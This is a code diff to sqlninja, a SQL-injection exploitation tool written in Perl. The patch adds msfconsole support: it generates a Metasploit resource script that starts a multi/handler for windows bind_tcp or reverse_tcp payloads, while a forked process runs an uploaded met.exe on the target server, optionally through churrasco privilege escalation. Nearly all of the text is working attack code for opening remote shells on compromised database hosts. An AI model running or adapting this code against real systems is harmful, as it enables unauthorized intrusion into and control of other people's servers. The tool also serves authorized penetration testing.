@@ -1,5 +1,5 @@
 # This file is part of sqlninja
-# Copyright (C) 2006-2013
+# Copyright (C) 2006-2014
 # http://sqlninja.sourceforge.net
 # icesurfer <r00t@northernfortress.net>
 # nico <nico@leidecker.info>
@@ -32,8 +32,10 @@ sub metasploit
 	# We start checking whether Metasploit is there...
 	print "[+] Checking Metasploit3 availability....\n";
 	my $msfcli = "";
+	my $msfconsole = "";
 	my $msfpayload = "";
 	my $msfencode = "";
+	my $msfclient = "";
 	if ($conf->{'msfpath'} eq "") {
 		my $path1 = $ENV{PATH};
 		my @path = split(/:/,$path1);
@@ -53,6 +55,11 @@ sub metasploit
 			} elsif (-e $_."/msfencode3") {
 				$msfencode = $_."/mfsencode3";
 			}
+			if (-e $_."/msfconsole") {
+				$msfconsole = $_."/msfconsole";
+			} elsif (-e $_."/msfconsole3") {
+				$msfconsole = $_."/msfconsole3";
+			}	
 		}
 	} else {
 		if ($conf->{'msfpath'} != m/\/$/) { # add a final slash, if needed
@@ -73,9 +80,18 @@ sub metasploit
 		} elsif (-e $conf->{'msfpath'}."msfencode3") {
 			$msfencode = $conf->{'msfpath'}."msfencode3";
 		}
+		if (-e $conf->{'msfpath'}."msfconsole") {
+			$msfconsole = $conf->{'msfpath'}."msfconsole";
+		} elsif (-e $conf->{'msfpath'}."msfconsole3") {
+			$msfconsole = $conf->{'msfpath'}."msfconsole3";
+		}
 	}
-	if ($msfcli eq "") {
+	if (($conf->{'msfclient'} eq "msfcli") and ($msfcli eq "")) {
 		print "[-] msfcli not found\n";
+		exit(-1);
+	}
+	if (($conf->{'msfclient'} eq "msfconsole") and ($msfconsole eq "")) {
+		print "[-] msfconsole not found\n";
 		exit(-1);
 	}
 	if ($msfpayload eq "") {
@@ -186,19 +202,19 @@ sub metasploit
 	
 	# A couple of variables to handle some delays, depending on
 	# who starts the connection
-	my $delaycli = 0;
-	my $delaydb = 0;
+	my $delayclient = 0;
+	my $delayserver = 0;
 	if ($conn eq "bind_tcp") {
-		$delaycli = 5;
+		$delayclient = 5;
 	} else {
-		$delaydb = 5;
+		$delayserver = $conf->{'msfserverdelay'}; # msfconsole can take a while to start
 	}
 	# The child handles the request to the target, the parent
 	# calls Metasploit
 	my $pid = fork();
 	if ($pid == 0) {
 		# Launch met.exe 
-		sleep($delaydb);
+		sleep($delayserver);
 		$cmd = "%TEMP%\\".$exe.".exe";
 		if ($conf->{'churrasco'} == 1) {
 			$cmd = usechurrasco($cmd);
@@ -208,7 +224,22 @@ sub metasploit
 		exit(0);
 	}
 	# This is the parent
-	sleep($delaycli);
+	sleep($delayclient);
+	if ($conf->{'msfclient'} eq "msfcli") {
+		runmsfcli($msfcli, $payload, $conn, $port, $host2);
+	} else {
+		runmsfconsole($msfconsole, $payload, $conn, $port, $host2);
+	}
+	exit(0);
+}
+
+sub runmsfcli
+{
+	my $msfcli = $_[0];
+	my $payload = $_[1];
+	my $conn = $_[2];
+	my $port = $_[3];
+	my $host2 = $_[4];
 	my $syscommand = $msfcli." multi/handler ".
 	              "payload=windows/".$payload."/".$conn." ";
 	if ($conn eq "bind_tcp") {
@@ -217,12 +248,41 @@ sub metasploit
 		$syscommand .= "lport=".$port." lhost=".$conf->{'lhost'}." E";
 	}
 	if ($conf->{'verbose'} == 1) {
-		print "[v] Execuring: ".$syscommand."\n";
+		print "[v] Executing: ".$syscommand."\n";
 	}
 	print "[+] Transferring control to msfcli. Have fun!\n\n";
 	system($syscommand);
 }
 
+sub runmsfconsole
+{
+	my $msfconsole = $_[0];
+	my $payload = $_[1];
+	my $conn = $_[2];
+	my $port = $_[3];
+	my $host2 = $_[4];
+	# create the script
+	my $rcscript = -1;
+	while ($rcscript == -1) {
+		my $tmpfile = "/tmp/msfscript-".int(rand()*999999).".rc";
+		if (!(-e $tmpfile)) {
+			$rcscript = $tmpfile;
+		}
+	}
+	open (OUT, ">".$rcscript);
+	print OUT "use exploit/multi/handler\n";
+	print OUT "set payload windows/".$payload."/".$conn."\n";
+	print OUT "set lport ".$port."\n";
+	if ($conn eq "bind_tcp") {
+		print OUT "set rhost ".$host2."\n";
+	} else {
+		print OUT "set lhost ".$conf->{'lhost'}."\n";
+	}
+	print OUT "exploit -j\n";
+	close OUT;
+	print "[+] Transferring control to msfconsole (might take a while to load). Have fun!\n\n";
+	system($msfconsole." -r ".$rcscript);
+}
 
 
 # Windows Server 2003 SP1+ has DEP enabled.... we need to take care of this
